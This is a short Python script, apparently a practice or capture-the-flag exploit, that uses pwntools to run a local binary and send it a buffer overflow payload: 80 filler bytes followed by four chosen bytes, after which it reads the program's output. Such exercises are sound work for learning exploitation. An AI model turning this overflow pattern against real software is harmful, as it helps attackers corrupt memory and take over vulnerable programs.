#!/usr/bin/python

from pwn import *
import os

context(arch='amd64', os='linux')

binary = './a.out'

elf = ELF(binary)

payload = "A"*80+"\x05\x03\x02\x01"

proc2 = process(binary)
info("send payload?")
pause()
proc2.sendline(payload)
r = proc2.recvline()
r += proc2.recvline()
print(r)
proc2.wait()
proc2.close()


